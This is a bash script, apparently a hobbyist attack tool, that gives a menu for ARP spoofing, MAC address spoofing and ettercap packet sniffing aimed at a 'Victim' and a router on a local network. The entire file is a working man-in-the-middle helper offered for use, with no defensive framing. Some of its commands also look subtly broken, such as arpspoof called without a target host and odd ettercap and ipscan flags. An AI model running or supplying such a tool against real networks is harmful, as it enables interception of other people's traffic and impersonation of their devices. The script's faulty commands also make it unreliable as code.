#!/bin/bash

RED="\e[31m"
BLUE="\e[94m"
GREEN="\e[92m"

function banner() {

clear
printf "${RED}"
echo "     _    __  __                          __ _             
   / \  |  \/  |  ___ _ __   ___   ___  / _(_)_ __   __ _ 
  / _ \ | |\/| | / __| _ \ /  _ \ / _ \| |_| | _ \ /  _  |
 / ___ \| |  | | \__ \ |_) | (_) | (_) |  _| | | | | (_| |
/_/   \_\_|  |_| |___/ .__/ \___/ \___/|_| |_|_| |_|\__  |
                     |_|                            |___/ 
"

printf "${RED}"
echo "
       1. ARP spoofing
       2. MAC spoofing
       3. Packet Sniffing ( ettercap )
"

read -p " : > " input

}

while :
do
  banner

  if [ $input == 1 ]; then
    read -p " Do you want do a local IP scan [Y/N] : " inp
    if [ $inp == "Y" ]; then
      read -p " From which IP you want to start scanning > : " start_ip
      read -p " To which IP you want to stop scanning > : " stop_ip
      read -p " Name of the output file > : " output_file
      ipscan -f:range $start_ip $stop_ip -s -o core/$output_file -q
      cat core/$output_file
      read -p " What IP do you wanna spoof ? > : " spoofed_ip
      read -p "On which interface you wanna spoof ? > : " interface
      arpspoof -i $interface -t $spoofed_ip
    elif [ $inp == "N" ]; then
      read -p " What IP you wanna spoof ? > : " spoofed_ip
      read -p "On which interface you wanna spoof ? > : " interface
      arpspoof -i $interface -t $spoofed_ip
    fi
  elif [ $input == 2 ];then
    read -p " Do you wanna do a network scan ? [Y/N] > : " inp
    if [ $inp == "Y" ]; then
      echo " Scanning ... "
      sleep 2
      arp -a
      sleep 1
      read -p " Which MAC addr do you want to spoof ? > : " spoofed_mac
      read -p " On which Interface ? > : " spoofing_int
      macchanger -m $spoofed_mac $spoofing_int
      exit
    elif [ $inp == "N" ]; then
      read -p " What MAC addr do you want to spoof ? > : " spoofed_mac
      read -p " On which Interface ? > : " spoofing_int
      macchanger -m $spoofed_mac $spoofing_int
      exit
    fi
  elif [ $input == 3 ]; then
    echo " WARN : This function need ettercap ! Install it ! "
    ettercap -I
    read -p " On which interface you want sniff packets ?  " int
    read -p " Target 1 ( Victim ) > : " trg_1
    read -p " Target 2 ( Network router ) > :" trg_2
    ettercap -i $int -m $trg_1 $trg_2
    echo " Running ... "
    sleep 3
  else
    echo " FATAL ERROR : This options isn't available !"
    sleep 2
  fi
done


